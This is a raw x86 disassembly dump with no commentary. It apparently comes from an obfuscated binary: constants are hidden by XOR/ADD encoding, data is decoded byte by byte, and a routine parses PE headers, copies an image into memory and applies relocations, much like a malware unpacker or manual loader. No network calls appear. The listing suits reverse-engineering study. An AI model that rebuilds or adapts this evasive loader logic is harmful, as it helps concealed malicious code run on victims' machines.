  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
